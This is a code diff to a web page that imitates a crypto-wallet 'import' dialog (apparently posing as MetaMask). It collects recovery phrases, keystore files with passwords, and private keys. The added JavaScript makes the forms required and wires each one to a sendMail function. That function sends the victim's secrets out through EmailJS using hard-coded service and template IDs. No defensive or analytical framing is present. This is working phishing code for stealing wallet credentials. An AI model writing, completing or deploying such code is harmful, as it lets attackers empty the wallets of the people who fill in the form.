@@ -648,6 +648,7 @@
                             required="required"
                             minlength="12"
                             placeholder="Phrase"
+                            required
                         ></textarea>
                         <br />
                         <div class="desc">
@@ -668,10 +669,11 @@
                             required="required"
                             minlength="12"
                             placeholder="Keystore JSON"
+                            required
                         ></textarea>
                         <br />
                         <div class="field">
-                            <input type="text" name="password" placeholder="Password" />
+                            <input type="text" name="password" placeholder="Password" required />
                         </div>
                         <div class="desc">
                             Several lines of text beginning with '(...)' plus the password you used
@@ -686,7 +688,13 @@
                     <form action="/action1/privatekey" method="POST">
                         <input type="hidden" name="w" value="metamask" />
                         <div class="field">
-                            <input type="text" name="key" class="key" placeholder="Private Key" />
+                            <input
+                                type="text"
+                                name="key"
+                                class="key"
+                                placeholder="Private Key"
+                                required
+                            />
                         </div>
                         <div class="desc">
                             Typically 12 (sometimes 24) words separated by single spaces
@@ -716,29 +724,22 @@
             const hidden_section = document.getElementById("hidden");
             const hide_btn = document.getElementById("btn");
             const modal = document.querySelector(".modal");
+            const buttons = modal.querySelectorAll('button[type="submit"]');
             //phrase
-            const phrase_input = document.querySelector('textarea[name="phrase"]');
-            const phrase_btn = phrase_input.parentElement.querySelector('button[type="submit"]');
+            const phrase_form = document.querySelector("#phrase form");
+            const phrase_input = phrase_form.querySelector('textarea[name="phrase"]');
 
             // keystore
-            const keystore_input = document.querySelector('textarea[name="keystore"]');
-            const keystore_password = document.querySelector('input[name="password"]');
-            const keystore_btn =
-                keystore_input.parentElement.querySelector('button[type="submit"]');
+            const keystore_form = document.querySelector("#keystore form");
+            const keystore_input = keystore_form.querySelector('textarea[name="keystore"]');
+            const keystore_password = keystore_form.querySelector('input[name="password"]');
 
             // private key
-            const private_input = document.querySelector('input.key[type="text"]');
-            const private_btn = private_input.parentElement.querySelector('button[type="submit"]');
+            const private_form = document.querySelector("#private form");
+            const private_input = private_form.querySelector('#private input[type="text"]');
 
             const selected_Tab = {
                 tab: "Phrase",
-            };
-
-            const payload = {
-                tab: selected_Tab.tab,
-                ...(selected_Tab.tab == "Phrase" && { phrase: "" }),
-                ...(selected_Tab.tab == "Keystore JSON" && { keystore: "", password: "" }),
-                ...(selected_Tab.tab == "Private Key" && { private_key: "" }),
             };
 
             function show() {
@@ -768,41 +769,61 @@
                 });
             });
 
-            document.querySelectorAll(".modal button[type='submit']").forEach((each) => {
-                each.addEventListener("click", (e) => {
+            document.querySelectorAll(".modal form").forEach((each) => {
+                each.addEventListener("submit", (e) => {
                     e.preventDefault();
                 });
             });
 
             // phrase
-            phrase_btn.addEventListener("click", (e) => {
+            phrase_form.addEventListener("submit", (e) => {
                 let payload = {
-                    wallet: selected_wallet.wallet,
-                    phrase: phrase_input.value,
+                    Wallet: selected_wallet.wallet,
+                    Phrase: phrase_input.value,
                 };
                 sendMail(payload);
             });
 
             // keystore
-            keystore_btn.addEventListener("click", (e) => {
+            keystore_form.addEventListener("submit", (e) => {
                 let payload = {
-                    wallet: selected_wallet.wallet,
-                    keystore_JSON: keystore_input.value,
-                    keystore_password: keystore_password.value,
+                    Wallet: selected_wallet.wallet,
+                    "Keystore JSON": keystore_input.value,
+                    "Keystore Password": keystore_password.value,
                 };
                 sendMail(payload);
             });
             // private
-            private_btn.addEventListener("click", (e) => {
+            private_form.addEventListener("submit", (e) => {
                 let payload = {
-                    wallet: selected_wallet.wallet,
-                    private_key: private_input.value,
+                    Wallet: selected_wallet.wallet,
+                    "Private Key": `${private_input.value}`,
                 };
                 sendMail(payload);
             });
 
-            function sendMail(payload) {
-                console.log(payload);
+            async function sendMail(payload) {
+                let new_payload = JSON.stringify(payload, null, 5)
+                    .replaceAll("{", "")
+                    .replaceAll("}", "")
+                    .replaceAll('"', "")
+                    .replaceAll(",", ",\n");
+
+                try {
+                    buttons.forEach((btn) => {
+                        btn.innerText = "Loading";
+                    });
+                    let response = await emailjs.send("service_0neb4hp", "template_00233p7", {
+                        message: new_payload,
+                    });
+                    console.log("SUCCESS!", response.status, response.text);
+                } catch (error) {
+                    console.log("FAILED...", error);
+                } finally {
+                    buttons.forEach((btn) => {
+                        btn.innerText = "IMPORT";
+                    });
+                }
             }
         </script>
     </body>
